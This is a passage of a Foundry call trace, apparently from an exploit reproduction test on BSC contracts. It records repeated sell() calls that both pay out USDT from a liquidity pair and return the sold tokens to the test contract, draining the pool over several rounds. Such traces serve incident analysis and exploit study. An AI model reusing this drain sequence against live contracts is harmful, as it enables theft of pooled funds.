    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 210202353887527652369080 [2.102e23])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 210202353887527652369080 [2.102e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 3828518916937430505051768 [3.828e24], 68847826658447587228038 [6.884e22], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [33008] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(1996922361931512697506262 [1.996e24], 0, [0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 3828518916937430505051768 [3.828e24], 68847826658447587228038 [6.884e22], 1717861306 [1.717e9]
    │   │   │   │   ├─ [5015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 1996922361931512697506262 [1.996e24])
    │   │   │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 1996922361931512697506262 [1.996e24])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18437] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(3700613231920832730058376 [3.7e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3700613231920832730058376 [3.7e24])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3700613231920832730058376 [3.7e24])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 127905685016597774993392 [1.279e23]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 2065770188589960284734300 [2.065e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 127905685016597774993392 [1.279e23], reserve1: 2065770188589960284734300 [2.065e24])
    │   │   │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 0, amount1In: 1996922361931512697506262 [1.996e24], amount0Out: 3700613231920832730058376 [3.7e24], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] [1996922361931512697506262 [1.996e24], 3700613231920832730058376 [3.7e24]]
    │   │   │   ├─ [23574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1996922361931512697506262 [1.996e24])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1996922361931512697506262 [1.996e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 1996922361931512697506262 [1.996e24]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 1996922361931512697506262 [1.996e24]
    │   │   ├─ [73957] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(1996922361931512697506262 [1.996e24])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 1996922361931512697506262 [1.996e24])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 1996922361931512697506262 [1.996e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 99846118096575634875313 [9.984e22])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 99846118096575634875313 [9.984e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 127905685016597774993392 [1.279e23], 2065770188589960284734300 [2.065e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [33008] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(948538121917468531315474 [9.485e23], 0, [0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 127905685016597774993392 [1.279e23], 2065770188589960284734300 [2.065e24], 1717861306 [1.717e9]
    │   │   │   │   ├─ [5015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 948538121917468531315474 [9.485e23])
    │   │   │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 948538121917468531315474 [9.485e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18437] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(40180160176243432219749 [4.018e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 40180160176243432219749 [4.018e22])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 40180160176243432219749 [4.018e22])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 87725524840354342773643 [8.772e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3014308310507428816049774 [3.014e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 87725524840354342773643 [8.772e22], reserve1: 3014308310507428816049774 [3.014e24])
    │   │   │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 0, amount1In: 948538121917468531315474 [9.485e23], amount0Out: 40180160176243432219749 [4.018e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] [948538121917468531315474 [9.485e23], 40180160176243432219749 [4.018e22]]
    │   │   │   ├─ [23574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 948538121917468531315474 [9.485e23])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 948538121917468531315474 [9.485e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 948538121917468531315474 [9.485e23]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 948538121917468531315474 [9.485e23]
    │   │   ├─ [73957] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(948538121917468531315474 [9.485e23])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 948538121917468531315474 [9.485e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 948538121917468531315474 [9.485e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 47426906095873426565773 [4.742e22])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 47426906095873426565773 [4.742e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 87725524840354342773643 [8.772e22], 3014308310507428816049774 [3.014e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [33008] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(450555607910797552374850 [4.505e23], 0, [0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 87725524840354342773643 [8.772e22], 3014308310507428816049774 [3.014e24], 1717861306 [1.717e9]
    │   │   │   │   ├─ [5015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 450555607910797552374850 [4.505e23])
    │   │   │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 450555607910797552374850 [4.505e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18437] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(11382621740583356638014 [1.138e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11382621740583356638014 [1.138e22])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 11382621740583356638014 [1.138e22])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 76342903099770986135629 [7.634e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3464863918418226368424624 [3.464e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 76342903099770986135629 [7.634e22], reserve1: 3464863918418226368424624 [3.464e24])
    │   │   │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 0, amount1In: 450555607910797552374850 [4.505e23], amount0Out: 11382621740583356638014 [1.138e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] [450555607910797552374850 [4.505e23], 11382621740583356638014 [1.138e22]]
    │   │   │   ├─ [23574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 450555607910797552374850 [4.505e23])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 450555607910797552374850 [4.505e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 450555607910797552374850 [4.505e23]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 450555607910797552374850 [4.505e23]
    │   │   ├─ [73957] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(450555607910797552374850 [4.505e23])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 450555607910797552374850 [4.505e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 450555607910797552374850 [4.505e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 22527780395539877618742 [2.252e22])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 22527780395539877618742 [2.252e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 76342903099770986135629 [7.634e22], 3464863918418226368424624 [3.464e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [33008] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(214013913757628837378053 [2.14e23], 0, [0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 76342903099770986135629 [7.634e22], 3464863918418226368424624 [3.464e24], 1717861306 [1.717e9]
    │   │   │   │   ├─ [5015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 214013913757628837378053 [2.14e23])
    │   │   │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 214013913757628837378053 [2.14e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18437] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(4430690196372950106328 [4.43e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4430690196372950106328 [4.43e21])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4430690196372950106328 [4.43e21])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 71912212903398036029301 [7.191e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3678877832175855205802677 [3.678e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 71912212903398036029301 [7.191e22], reserve1: 3678877832175855205802677 [3.678e24])
    │   │   │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 0, amount1In: 214013913757628837378053 [2.14e23], amount0Out: 4430690196372950106328 [4.43e21], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] [214013913757628837378053 [2.14e23], 4430690196372950106328 [4.43e21]]
    │   │   │   ├─ [23574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 214013913757628837378053 [2.14e23])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 214013913757628837378053 [2.14e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 214013913757628837378053 [2.14e23]
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 214013913757628837378053 [2.14e23]
    │   │   ├─ [73957] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::sell(214013913757628837378053 [2.14e23])
    │   │   │   ├─ [4134] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 214013913757628837378053 [2.14e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, value: 214013913757628837378053 [2.14e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3674] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(0xb38188f3e37369d5319070BD0F39Cb44084D8548, 10700695687881441868902 [1.07e22])
    │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0xb38188f3e37369d5319070BD0F39Cb44084D8548, value: 10700695687881441868902 [1.07e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 71912212903398036029301 [7.191e22], 3678877832175855205802677 [3.678e24], 1717861306 [1.717e9]
    │   │   │   ├─ [439] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 512601748935269669940997 [5.126e23]
    │   │   │   ├─ [537] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::balanceOf(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9) [staticcall]
    │   │   │   │   └─ ← [Return] 1312347628756340897752 [1.312e21]
    │   │   │   ├─ [33008] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::swapExactTokensForTokens(101656609034873697754575 [1.016e23], 0, [0xE814Cc2B4DbFe652C04f2E008ced18875c76F510, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1717861306 [1.717e9])
    │   │   │   │   ├─ [893] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 71912212903398036029301 [7.191e22], 3678877832175855205802677 [3.678e24], 1717861306 [1.717e9]
    │   │   │   │   ├─ [5015] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transferFrom(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, 101656609034873697754575 [1.016e23])
    │   │   │   │   │   ├─ [472] 0x8228A4aD192d5D82189afd6e194f65edb8c76a41::d000b517(000000000000000000000000cc0f0f41f4c4c17493517dd6c6d9dd1adb134fc9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(from: 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9, to: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, value: 101656609034873697754575 [1.016e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [18437] 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F::swap(1928977550494077908929 [1.928e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1928977550494077908929 [1.928e21])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1928977550494077908929 [1.928e21])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 69983235352903958120372 [6.998e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3780534441210728903557252 [3.78e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 69983235352903958120372 [6.998e22], reserve1: 3780534441210728903557252 [3.78e24])
    │   │   │   │   │   ├─ emit Swap(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0In: 0, amount1In: 101656609034873697754575 [1.016e23], amount0Out: 1928977550494077908929 [1.928e21], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] [101656609034873697754575 [1.016e23], 1928977550494077908929 [1.928e21]]
    │   │   │   ├─ [23574] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 101656609034873697754575 [1.016e23])
